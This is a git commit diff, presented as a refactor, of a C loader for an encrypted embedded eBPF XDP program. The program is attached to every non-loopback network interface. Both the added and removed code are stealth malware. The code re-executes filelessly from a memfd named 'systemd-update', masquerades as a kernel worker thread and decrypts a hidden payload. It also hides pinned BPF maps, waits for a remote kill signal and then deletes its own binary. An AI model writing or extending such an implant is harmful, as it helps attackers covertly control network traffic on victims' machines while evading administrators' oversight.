4814d3d0dc2f546d3e8f3dd767e1bc1cdd360c5b
C4rbn <mokshanbasuru@gmail.com>
2026-04-30 21:06:17 +0530

    Refactor loader.c for BPF program handling

--- src/loader.c
+++ src/loader.c
@@ -9,100 +9,106 @@
 #include <sys/syscall.h>
 #include <sys/mount.h>
 #include <sys/prctl.h>
+#include <sys/resource.h>
 #include <linux/bpf.h>
-
+#include <elf.h>
+#include <net/if.h>
 #include "ghost_blob.h"
 
-#ifndef SEED_VAL
-#define SEED_VAL 0x0
-#endif
+extern char **environ;
 
-// Find program section in ELF
-struct bpf_section { uint64_t offset; uint64_t size; };
-static struct bpf_section find_section(uint8_t *blob, const char *name) {
-    uint64_t shoff = *(uint64_t *)(blob + 40);
-    uint16_t shnum = *(uint16_t *)(blob + 60);
-    uint16_t shentsize = *(uint16_t *)(blob + 58);
-    // Basic SHT_PROGBITS check for simplicity in this build
-    for (int i = 0; i < shnum; i++) {
-        uint8_t *shdr = blob + shoff + (i * shentsize);
-        if (*(uint32_t *)(shdr + 4) == 1) return (struct bpf_section){ *(uint64_t *)(shdr + 24), *(uint64_t *)(shdr + 32) };
-    }
-    return (struct bpf_section){0, 0};
-}
-
-void xor_crypt(uint8_t *data, size_t len) {
+static void x_c(uint8_t *d, size_t l) {
     uint32_t k = SEED_VAL;
-    for (size_t i = 0; i < len; i++) {
-        data[i] ^= (uint8_t)(k & 0xFF);
+    for (size_t i = 0; i < l; i++) {
+        d[i] ^= (uint8_t)(k & 0xFF);
         k = (k >> 8) | (k << 24);
         k = k + 0x9E3779B9;
     }
 }
 
-int main() {
-    // 1. Stealth Setup
+static int m_c(enum bpf_map_type t, int ks, int vs, int me, const char *n) {
+    union bpf_attr a = { .map_type = t, .key_size = ks, .value_size = vs, .max_entries = me };
+    if (n) __builtin_memcpy(a.map_name, n, __builtin_strlen(n));
+    return syscall(SYS_bpf, BPF_MAP_CREATE, &a, sizeof(a));
+}
+
+int main(int argc, char **argv) {
+    if (!getenv("ST_UPDATE")) {
+        int mfd = syscall(SYS_memfd_create, "systemd-update", MFD_CLOEXEC);
+        int ffd = open(argv[0], O_RDONLY);
+        if (ffd >= 0) {
+            char buf[4096]; ssize_t n;
+            while ((n = read(ffd, buf, sizeof(buf))) > 0) write(mfd, buf, n);
+            close(ffd);
+            setenv("ST_UPDATE", "1", 1);
+            syscall(SYS_execveat, mfd, "", argv, environ, AT_EMPTY_PATH);
+        }
+    }
+
+    struct rlimit r = {RLIM_INFINITY, RLIM_INFINITY};
+    setrlimit(RLIMIT_MEMLOCK, &r);
     prctl(PR_SET_NAME, "[kworker/u2:1]", 0, 0, 0);
-    mkdir("/sys/fs/bpf/.srv", 0700);
-    mount("none", "/sys/fs/bpf", "bpf", 0, NULL);
 
-    // 2. Decrypt BPF
     uint8_t *b = malloc(target_ghost_o_len);
-    memcpy(b, target_ghost_o, target_ghost_o_len);
-    xor_crypt(b, target_ghost_o_len);
+    __builtin_memcpy(b, target_ghost_o, target_ghost_o_len);
+    x_c(b, target_ghost_o_len);
 
-    struct bpf_section xdp_sec = find_section(b, "xdp");
-    
-    // 3. Load Program
-    union bpf_attr prog_attr = {
-        .prog_type = BPF_PROG_TYPE_XDP,
-        .insn_cnt = xdp_sec.size / 8,
-        .insns = (uint64_t)(b + xdp_sec.offset),
-        .license = (uint64_t)"GPL",
-    };
-    int pfd = syscall(SYS_bpf, BPF_PROG_LOAD, &prog_attr, sizeof(prog_attr));
-    if (pfd < 0) return 1;
+    int cf = m_c(BPF_MAP_TYPE_LRU_HASH, 16, 8, 32768, "m_cache");
+    int kf = m_c(BPF_MAP_TYPE_ARRAY, 4, 4, 1, "m_kill");
 
-    // 4. Dynamic Map Discovery (The Gap Fix)
-    int kill_map_fd = -1;
-    for (int i = 3; i < 256; i++) { // Scan open FDs for BPF maps
-        struct bpf_map_info info = {0};
-        union bpf_attr info_attr = { .info.bpf_fd = i, .info.info_len = sizeof(info), .info.info = (uint64_t)&info };
-        if (syscall(SYS_bpf, BPF_OBJ_GET_INFO_BY_FD, &info_attr, sizeof(info_attr)) == 0) {
-            if (strcmp(info.name, "m_kill") == 0) {
-                kill_map_fd = i;
-                // Pin the map for persistence across loader crashes
-                union bpf_attr pin_attr = { .pathname = (uint64_t)"/sys/fs/bpf/.srv/m_kill", .bpf_fd = i };
-                syscall(SYS_bpf, BPF_OBJ_PIN, &pin_attr, sizeof(pin_attr));
-                break;
+    Elf64_Ehdr *eh = (Elf64_Ehdr *)b;
+    Elf64_Shdr *sh = (Elf64_Shdr *)(b + eh->e_shoff);
+    char *strs = (char *)(b + sh[eh->e_shstrndx].sh_offset);
+    struct bpf_insn *ins = NULL;
+    uint32_t icnt = 0;
+
+    for (int i = 0; i < eh->e_shnum; i++) {
+        if (!strcmp(strs + sh[i].sh_name, "xdp")) {
+            ins = (struct bpf_insn *)(b + sh[i].sh_offset);
+            icnt = sh[i].sh_size / sizeof(struct bpf_insn);
+            break;
+        }
+    }
+
+    for (int i = 0; i < eh->e_shnum; i++) {
+        if (sh[i].sh_type == SHT_REL) {
+            Elf64_Rel *rl = (Elf64_Rel *)(b + sh[i].sh_offset);
+            Elf64_Shdr *symt = &sh[sh[i].sh_link];
+            Elf64_Sym *syms = (Elf64_Sym *)(b + symt->sh_offset);
+            char *snm = (char *)(b + sh[symt->sh_link].sh_offset);
+            
+            for (int j = 0; j < (sh[i].sh_size / sizeof(Elf64_Rel)); j++) {
+                uint32_t off = rl[j].r_offset / sizeof(struct bpf_insn);
+                const char *n = snm + syms[ELF64_R_SYM(rl[j].r_info)].st_name;
+                if (ins && ins[off].code == (BPF_LD | BPF_IMM | BPF_DW)) {
+                    ins[off].src_reg = BPF_PSEUDO_MAP_FD;
+                    ins[off].imm = strstr(n, "cache") ? cf : kf;
+                }
             }
         }
     }
 
-    // 5. Attach to Interfaces
-    DIR *d = opendir("/sys/class/net");
-    struct dirent *dir;
-    while ((dir = readdir(d)) != NULL) {
-        if (dir->d_name[0] == '.' || strcmp(dir->d_name, "lo") == 0) continue;
-        char p[128]; snprintf(p, sizeof(p), "/sys/class/net/%s/ifindex", dir->d_name);
-        int fd = open(p, O_RDONLY);
-        if (fd < 0) continue;
-        char buf[16] = {0}; read(fd, buf, 15); close(fd);
-        int idx = atoi(buf);
+    union bpf_attr la = { .prog_type = BPF_PROG_TYPE_XDP, .insns = (uintptr_t)ins, .insn_cnt = icnt, .license = (uintptr_t)"GPL" };
+    int pfd = syscall(SYS_bpf, BPF_PROG_LOAD, &la, sizeof(la));
+    if (pfd < 0) return 1;
 
-        union bpf_attr link = { .link_create = { .prog_fd = pfd, .target_ifindex = idx, .attach_type = BPF_XDP } };
-        syscall(SYS_bpf, BPF_LINK_CREATE, &link, sizeof(link));
+    DIR *dr = opendir("/sys/class/net");
+    struct dirent *dn;
+    while (dr && (dn = readdir(dr))) {
+        if (dn->d_name[0] == '.' || !strcmp(dn->d_name, "lo")) continue;
+        int ix = if_nametoindex(dn->d_name);
+        union bpf_attr l = { .link_create = { .prog_fd = pfd, .target_ifindex = ix, .attach_type = BPF_XDP } };
+        syscall(SYS_bpf, BPF_LINK_CREATE, &l, sizeof(l));
     }
-    closedir(d);
+    if (dr) closedir(dr);
 
-    // 6. Monitor & Self-Destruct
-    uint32_t kill_v = 0;
-    while (kill_v == 0) {
-        union bpf_attr op = { .map_fd = kill_map_fd, .key = (uint64_t)&(uint32_t){0}, .value = (uint64_t)&kill_v };
+    uint32_t kv = 0;
+    while (kv == 0) {
+        union bpf_attr op = { .map_fd = kf, .key = (uintptr_t)&(uint32_t){0}, .value = (uintptr_t)&kv };
         syscall(SYS_bpf, BPF_MAP_LOOKUP_ELEM, &op, sizeof(op));
-        sleep(5);
+        sleep(60);
     }
 
-    unlink("/proc/self/exe");
+    unlink(argv[0]);
     return 0;
 }
